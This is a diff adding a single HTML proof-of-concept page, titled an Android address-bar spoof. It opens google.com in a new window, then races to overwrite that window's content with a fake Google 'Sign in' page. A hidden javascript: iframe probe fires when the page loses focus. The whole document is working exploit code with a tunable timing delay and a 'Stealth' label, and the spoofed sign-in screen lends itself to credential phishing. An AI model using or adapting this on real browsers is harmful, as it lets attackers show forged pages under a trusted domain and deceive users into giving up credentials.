@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Android Address Bar Spoof (Stealth) - Google.com</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+</head>
+<body>
+<script>
+(function(){
+  const target = "https://www.google.com";
+  const delay = 25; // tweak 20–50 ms untuk Android
+  const payload = `<!doctype html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Google</title></head>
+<body style="font-family:Arial,Helvetica,sans-serif;padding:24px">
+<h2 style="color:#1a73e8;margin:0 0 8px 0">Sign in</h2>
+<p>Injected PoC content. domain=<b><script>document.write(document.domain)</script></b></p>
+<button style="padding:10px 14px;border:0;border-radius:10px;background:#1a73e8;color:#fff"
+onclick="alert('PoC injected')">OK</button>
+</body></html>`;
+
+  const child = window.open(target, '_blank');
+  if(!child){ return; }
+
+  const start = performance.now();
+  let wrote = false;
+
+  const race = setInterval(() => {
+    try {
+      child.document.open();
+      child.document.write(payload);
+      child.document.close();
+      wrote = true;
+      clearInterval(race);
+    } catch(e) {
+      clearInterval(race);
+    }
+  }, delay);
+
+  setTimeout(()=>clearInterval(race), 1000);
+
+  // optional: blur probe
+  window.addEventListener('blur', () => {
+    try { const f = document.createElement('iframe'); f.style.display='none';
+      f.src = "javascript:alert('blur-probe')";
+      document.body.appendChild(f);
+    } catch(e){}
+  }, {once:true});
+})();
+</script>
+</body>
+</html>
